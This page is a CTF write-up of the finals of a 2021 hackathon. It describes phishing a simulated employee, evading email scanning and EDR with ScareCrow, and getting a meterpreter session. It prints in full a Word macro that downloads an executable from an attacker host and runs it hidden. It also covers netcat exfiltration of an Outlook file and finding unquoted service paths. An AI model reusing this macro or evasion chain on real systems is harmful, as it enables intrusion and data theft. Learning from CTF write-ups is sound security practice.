@@ -1,0 +1,202 @@
+<!DOCTYPE html>
+
+
+<html lang="en">
+<meta http-equiv="Content-Security-Policy" content="default-src 'none'; script-src 'self'; style-src 'self' https://fonts.googleapis.com; img-src 'self'; font-src 'self' https://fonts.gstatic.com; connect-src 'self'; media-src 'self'; object-src 'self'; child-src 'self'; form-action 'none'; base-uri 'self'" />
+<meta http-equiv="X-XSS-Protection"  content="1;mode=block" always>
+<meta http-equiv="Referrer-Policy" content="no-referrer, strict-origin-when-cross-origin"><head>
+  <meta charset="utf-8">
+  <meta http-equiv="X-UA-Compatible" content="IE=edge">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no" />
+  <title>ABC RedTeam CTF</title>
+ 
+
+  <link rel="stylesheet" type="text/css" href="/assets/main-hacker.css"></head>
+<body>
+    <div class="container"><header>
+  <div class="menu">
+    <ul>
+      <li class="menu-first-child">
+        <span>
+          [cyberRat@RedTeam]~$
+          <span class="blink">
+            █
+          </span>
+        </span>
+      </li>
+      <li>
+        <a href="/">Home</a>
+      </li>
+
+    
+      <li>
+        <a href="/brainbox/">/BrainBox</a>
+      </li> 
+      <li>
+        <a href="/resume/">/Resume</a>
+      </li>
+
+    </ul>
+  </div>
+</header>
+
+<main>
+      <h2 id="abc-cyberhackathon-redteam-ctf"><strong>ABC CyberHackathon RedTeam CTF</strong></h2>
+
+<h4 id="cy3er-r4t"><a href="https://cyberrat.medium.com/">CY3ER-R4T</a></h4>
+<h2 id="introduction">INTRODUCTION</h2>
+
+<p>My team RedTeamNG recently came first in the The American Business Council Cybersecurity Hackathon 2021 organized by NaijaSecForce in patnership with major sponsors bothering from American Business Council,Microsoft,AWS, Cisco, Comercio, HP, IBM and others</p>
+
+<p>This write up would be focused only on the finals and specifically the RedTeam challenges running through the methodology used to tackling it,<br />
+other post by my team mate <a href="https://muzec0318.github.io/posts/abcctf.html">Muzec</a> would be covering the Web Challenges.</p>
+
+<h3 id="scenario">SCENARIO</h3>
+
+<p>The scenario we are presented with by the organizers is that of an Fat Fingered individual that unconsciously opens every email and attachment he gets in he’s corporate email : <a href="http://mailto:obiora_nurudeen@ctf.ng">obiora_nurudeen@ctf.ng</a></p>
+
+<p><img src="/assets/images/abcctf/scenario.png" alt="image-title-here" class="img-responsive" />
+<!--<img src="/assets/images/abcctf/scenario.png" height="100%" width="100%">--></p>
+
+<p>Armed with just he’s name Nurudeen Obiora, the email above and the knowledge of the targets low awareness in basic email security,<br />
+we thought of emulating a strategy we recently used at the DEFCON 29 RedTeam CTF by sending the target an email with the reverse shell payload attached.</p>
+
+<p>Now here is where the problem begins, as with almost every field: There is a race, race between Good and Bad, Positive and Negative<br />
+our intentions are of no good so every mechanism of security is against us which is a “replica” of a real life situation</p>
+
+<p><strong>1st attempt:</strong> <em>Sending an msfvenom payload + gmail</em><br />
+Using msfvenom we created a windows reverse shell payload</p>
+
+<p><img src="/assets/images/abcctf/msfvenom.gif" height="100%" width="100%" /></p>
+
+<p>Attempting to send it to the target using swaks<br />
+swaks : SWiss Army Knife Smtp</p>
+
+<p>we are immediately flagged as malicious by Gmails Egress Malware Scanner</p>
+
+<p><img src="/assets/images/abcctf/egress-gmail.gif" height="100%" width="100%" /></p>
+
+<p><strong>2nd attempts:</strong> We resulted into trying several empire powershell payload and bypasses, Persian Hydra Xor encryption with Custom keys, EgeBalci/sgn Shikata_ga_nai encoder, All to no avail</p>
+
+<p><img src="/assets/images/abcctf/head-boom.gif" height="100%" width="100%" /></p>
+
+<p><strong>Final attempt:</strong> After numerous swift and failed attempt, we remembered Matthew Eidelberg talk at SourceZero Con : Remaining Invisible in the Age of EDR, a talk which showcase the ability to bypass defenses with a term called DLL unhooking using the ScareCrow Binary</p>
+
+<p>In short, we can generate some raw shellcode from the software of our choice (Cobalt Strike, Metasploit, PoshC2, etc) and pass it to the Scarecrow to get a loader back that will implement some common EDR evasion techniques.</p>
+
+<p>we decide to create a create a <code class="language-plaintext highlighter-rouge">windows/x64/meterpreter\reverse\tcp</code> shellcode using msfvenom [msfvenom shellcode is a pain, its crappy and might be unstable at times]
+<img src="/assets/images/abcctf/msfvenom.gif" height="100%" width="100%" /></p>
+
+<p>then pass the raw shellcode to the scarecrow binary along with a random domain name for a cloned signed certificate</p>
+
+<p><img src="/assets/images/abcctf/scarecrow.png" height="100%" width="100%" /></p>
+
+<p>we then created a meterpreter listener using the connection variable of the shellcode as options: “would have preferred Cobalt-strike but its for the BigBoys like InfosecShinobi 🙂”</p>
+
+<h3 id="delivery">DELIVERY</h3>
+
+<p>The output of ScareCrow is an obfuscated .exe payload, being at the third stage of the “cyber attack cycle” which is delivery<br />
+we somehow need to get the payload the victim machine and “run” it</p>
+
+<p>We decided to use the old aged Microsoft Word Document with macro in the .docm extension,<br />
+the function of the macro was to run a powershell one-liner that downloads the payload [Powerpnt.exe] binary hosted on our machine, store it in C:\windows\temp\ and then run it</p>
+
+<blockquote>
+  <p>Sub Document_Open()<br />
+MyMacro<br />
+End Sub</p>
+
+  <p>Sub AutoOpen()<br />
+MyMacro<br />
+End Sub</p>
+
+  <p>Sub MyMacro()<br />
+Dim str As String<br />
+str = “powershell iwr -uri <a href="http://20.87.43.15/OutLook.exe">http://x.x.x.x/</a>Powerpnt.exe -o c:\windows\temp\Powerpnt.exe; c:\windows\temp\Powerpnt.exe”<br />
+GetObject<strong>(</strong>“winmgmts:”<strong>)</strong>.Get<strong>(</strong>“Win32_Process”<strong>)</strong>.Create str, Null, Null, pid<br />
+Shell str, vbHide<br />
+End Sub</p>
+</blockquote>
+
+<p><img src="/assets/images/abcctf/macro.png" height="100%" width="100%" /></p>
+
+<p>it isnt advised to host any binary payload with the python http.server as there can be issues with the way it handles powershell Invoke Web Request or HTTPrequest  at times, starting a proper apache server is a better option 
+Also know what port your binary is hosted on is important as there could be egress firewalls on the victim PC to non HTTP, HTTPS port</p>
+
+<p><img src="/assets/images/abcctf/apache_host.gif" height="100%" width="100%" /></p>
+
+<h3 id="weaponization">WEAPONIZATION</h3>
+
+<p>Weaponized the final email and sent the .docm to the target by gmail</p>
+
+<p><img src="/assets/images/abcctf/weapon-email.png" height="100%" width="100%" /></p>
+
+<p>Tick! tock! Tick! tock!<br />
+Itchy finger Nurudeen opens the malicious document with the payload sending us a meterpreter session on our VPS [wish it was cobalt strike, somebody buy us cobalt strike already!!]</p>
+
+<p><img src="/assets/images/abcctf/meterpreter.png" height="100%" width="100%" /></p>
+
+<p>Now the hunt for flags begin, which literally means <em>ENUMERATION</em><br />
+checking to see what the internal IP looks like, we find the user IP address we we already solved the unintended way by checking the header of the response email<code class="language-plaintext highlighter-rouge">\[FLAG8\]</code></p>
+
+<p><img src="/assets/images/abcctf/header.png" height="100%" width="100%" /></p>
+
+<p>checking the current user directory and finding <code class="language-plaintext highlighter-rouge">unattend.xml</code> that contains <code class="language-plaintext highlighter-rouge">\[FLAG4\]</code></p>
+
+<p><img src="/assets/images/abcctf/ctf_xml.jpeg" height="100%" width="100%" /></p>
+
+<p>curious about what local users are on the machine just to get an idea of what movement of privilege escalation was necessary, lateral or horizontal<br />
+we find two more flags <code class="language-plaintext highlighter-rouge">\[FLAG3\]</code> <code class="language-plaintext highlighter-rouge">\[FLAG5\]</code></p>
+
+<p><img src="/assets/images/abcctf/net_user.jpeg" height="100%" width="100%" /></p>
+
+<p>One of the challenges goes by the name “Registry Never Lies” which immediately prompted us to query the registry table to find [FLAG2]</p>
+
+<p><img src="/assets/images/abcctf/regq.jpeg" height="100%" width="100%" /></p>
+
+<p>The what seems to be easy challenge turned to a battle “Outlook Storage 150points”, as most application data are stored in %APPDATA% we dived into it to get our hands on the loot after a quick research we figure the ost file is the microsoft outlook data bucket trying to transfer the file using the netcat binary, it failed cause the file was currently locked with the outlook process.</p>
+
+<p>We proceeded to killing the process and sending the OST to our local machine with netcat</p>
+
+<p><img src="/assets/images/abcctf/task_kill.jpeg" height="100%" width="100%" /></p>
+
+<p>Converting the ost with the steller converter we find <code class="language-plaintext highlighter-rouge">\[FLAG1\]</code></p>
+
+<p><img src="/assets/images/abcctf/steller.png" height="100%" width="100%" /></p>
+
+<p>After running out of flags to find, it was time for horizontal privilege escalation</p>
+
+<h3 id="lateral-privilege-escalation">LATERAL PRIVILEGE ESCALATION</h3>
+<p><strong>Machine Misconfigured with an Unquoted Service Path</strong></p>
+
+<p>Sometimes it is possible to escalate privileges by abusing mis-configured services. Specifically, this is possible if path to the service binary is not wrapped in quotes and there are spaces in the path..<br />
+If you are using a long file name that contains a space, use quoted strings to indicate where the file name ends and the arguments begin; otherwise, the file name is ambiguous.</p>
+
+<p>For example, consider the string “c:\program files\safe software\enjoy.exe”. This string can be interpreted in a number of ways.<br />
+The system tries to interpret the possibilities in the following order:</p>
+
+<p><strong>c:\program.exe</strong><br />
+<strong>c:\program files\safe.exe</strong><br />
+<strong>c:\program files\safe software\enjoy.exe</strong></p>
+
+<p>if any of the directory along the path is writable and said service is running with system privileges then this misconfiguration is easily exploitable</p>
+
+<p>we can enumerate and find Unquoted Service Path by using the wmic command <code class="language-plaintext highlighter-rouge">wmic service get name,pathname</code></p>
+
+<p>we can aswell check to see if the service is running with system privileges still by using wmic <code class="language-plaintext highlighter-rouge">wmic service get pathname,startname</code></p>
+
+<p><img src="/assets/images/abcctf/servicepath.png" height="100%" width="100%" /></p>
+
+<blockquote>
+  <p><strong>END OF PART ONE</strong></p>
+  <h4 id="the-difference-between-a-noob-and-a-hacker-is-that-a-hacker-has-failed-more-than-a-noob-has-ever-tried">The difference between a noob and a hacker is that a hacker has failed more than a noob has ever tried</h4>
+</blockquote>
+
+
+
+    </main><footer>
+  <a href="https://twitter.com/ratilovich">Twitter</a> 
+</footer>
+</div>
+  </body>
+</html>
